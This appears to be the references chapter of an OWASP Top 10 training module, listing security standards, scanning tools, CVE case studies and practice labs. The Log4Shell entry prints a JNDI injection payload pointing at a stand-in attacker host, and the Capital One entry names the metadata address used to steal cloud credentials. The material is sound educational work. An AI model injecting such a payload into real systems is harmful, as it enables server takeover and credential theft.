---
title: "08. References & Tooling"
description: "Authoritative security standards (NIST, ASVS, WSTG, PCI-DSS), SAST/DAST scanner matrix, and notable CVE case study references."
keywords: ["AppSec", "References", "OWASP ASVS", "NIST SP 800-53", "WSTG", "CVE Case Studies", "Semgrep", "OWASP ZAP"]
---

# 08. References & Tooling

This chapter provides authoritative standards, security frameworks, automated tooling references, and historical CVE case studies mapped to the OWASP Top 10 categories.

---

## 1. Industry Standards & Governance Frameworks

- **[OWASP Top 10 Official Documentation](https://owasp.org/Top10/)** — Official OWASP Top 10 2021 report, methodology, and data analysis.
- **[OWASP Application Security Verification Standard (ASVS v4.0.3)](https://owasp.org/www-project-application-security-verification-standard/)** — Detailed security requirements framework for designing, building, and testing secure web applications.
- **[OWASP Web Security Testing Guide (WSTG v4.2)](https://owasp.org/www-project-web-security-testing-guide/)** — Comprehensive manual and automated penetration testing methodology.
- **[NIST SP 800-53 Rev. 5](https://csrc.nist.gov/publications/detail/sp/800-53/rev-5/final)** — Security and Privacy Controls for Information Systems and Organizations.
- **[PCI-DSS v4.0 Standard](https://www.pcisecuritystandards.org/)** — Payment Card Industry Data Security Standard requirements for applications processing payment cardholder data.

---

## 2. Security Tooling Matrix (SAST, DAST, SCA & Secrets)

| Tool Name | Tool Type | Supported Languages / Ecosystems | Primary OWASP Focus | Open Source / License |
|---|---|---|---|---|
| **[Semgrep](https://semgrep.dev/)** | SAST | Python, JS/TS, Go, Java, C#, Ruby, PHP | A01, A02, A03, A05 | Open Source (LGPL 2.1) |
| **[OWASP ZAP](https://www.zaproxy.org/)** | DAST | Agnostic (Web HTTP/HTTPS APIs) | A01, A03, A05, A10 | Open Source (Apache 2.0) |
| **[CodeQL](https://codeql.github.com/)** | SAST / Taint Analysis | C/C++, C#, Go, Java, JS/TS, Python, Ruby | A01, A03, A10 | Free for Public Repos |
| **[Trivy](https://aquasecurity.github.io/trivy/)** | SCA / Container Scan | OS packages, npm, PyPI, Go modules, Maven | A06 (Vulnerable Components) | Open Source (Apache 2.0) |
| **[Gitleaks](https://github.com/gitleaks/gitleaks)** | Secret Scanner | Git Repositories, File Systems, CI/CD | A02 (Cryptographic Failures) | Open Source (MIT) |
| **[Bandit](https://github.com/PyCQA/bandit)** | SAST | Python | A02, A03, A05 | Open Source (Apache 2.0) |
| **[ESLint Security](https://github.com/eslint-community/eslint-plugin-security)** | SAST | Node.js / JavaScript | A03, A05 | Open Source (MIT) |

---

## 3. Notable Historical CVE Case Studies

Analyzing major real-world breaches highlights the real-world impact of OWASP Top 10 vulnerabilities:

### 1. CVE-2021-44228 (Log4Shell)
- **OWASP Category:** A03: Injection & A06: Vulnerable Components
- **Mechanism:** JNDI lookup string injection in Apache Log4j (`${jndi:ldap://attacker.com/a}`) leading to Remote Code Execution (RCE) without authentication.
- **Impact:** Hundreds of millions of servers worldwide exposed to immediate takeover.

### 2. CVE-2023-34362 (MOVEit Transfer SQLi)
- **OWASP Category:** A03: Injection
- **Mechanism:** Unauthenticated SQL injection vulnerability in the MOVEit Transfer web application allowed attackers to access underlying databases and exfiltrate files.
- **Impact:** Over 2,000 organizations compromised with massive data exfiltration.

### 3. Capital One Cloud SSRF Breach (2019)
- **OWASP Category:** A10: Server-Side Request Forgery & A01: Access Control
- **Mechanism:** Misconfigured Web Application Firewall (WAF) was exploited via SSRF to query the internal AWS EC2 Instance Metadata Service (`169.254.169.254`), retrieving IAM role credentials.
- **Impact:** Theft of personal data for over 100 million individuals.

### 4. CVE-2024-21626 (runc Container Escape)
- **OWASP Category:** A01: Broken Access Control & A05: Misconfiguration
- **Mechanism:** File descriptor leak in `runc` allowed containerized processes to access host file paths (`/proc/self/cwd`), breaking out of container isolation.
- **Impact:** Complete host compromise from inside unprivileged containers.

---

## 4. Hands-On Security Training Platforms

Practice exploiting and remediating OWASP Top 10 vulnerabilities in legal, sandboxed environments:

- **[PortSwigger Web Security Academy](https://portswigger.net/web-security)** — Free online web security labs covering SQLi, IDOR, SSRF, CORS, XXE, and Auth flaws.
- **[OWASP Juice Shop](https://owasp.org/www-project-juice-shop/)** — Intentionally insecure Node.js/Angular web application designed for security training.
- **[Damn Vulnerable Web Application (DVWA)](https://github.com/digininja/DVWA)** — PHP/MySQL vulnerable web application for testing penetration testing skills.

---

> [!NOTE]
> *This concludes the OWASP Top 10 Deep Dive module. Return to the [Module Overview & Index →](README.md) to review specific sections or practice with the hands-on lab.*
